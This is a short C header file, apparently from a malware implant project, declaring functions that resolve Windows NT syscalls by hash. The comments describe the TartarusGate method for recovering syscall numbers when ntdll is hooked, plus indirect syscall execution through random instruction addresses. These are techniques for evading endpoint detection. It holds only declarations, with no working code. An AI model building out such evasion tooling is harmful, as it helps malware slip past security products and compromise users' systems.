#ifndef _SYSCALLS_H
#define _SYSCALLS_H

#include "common.h"

// =============================================
// Initialize NTDLL export table config (cached)
// Must be called before any FetchNtSyscall calls
// =============================================
BOOL InitNtdllConfigStructure(VOID);

// =============================================
// Resolve a syscall by hash:
//   - Finds SSN (handles hooked + unhooked syscalls)
//   - Finds syscall address in ntdll
//   - Finds a random 'syscall' instruction address for indirect execution
// Uses TartarusGate approach (neighbor SSN resolution when hooked)
// =============================================
BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys);

// =============================================
// Initialize all syscalls used by the implant
// Populates global g_Nt structure
// =============================================
BOOL InitializeNtSyscalls(VOID);

// Global syscall table (defined in syscalls.c)
extern NTAPI_FUNC g_Nt;

#endif // _SYSCALLS_H
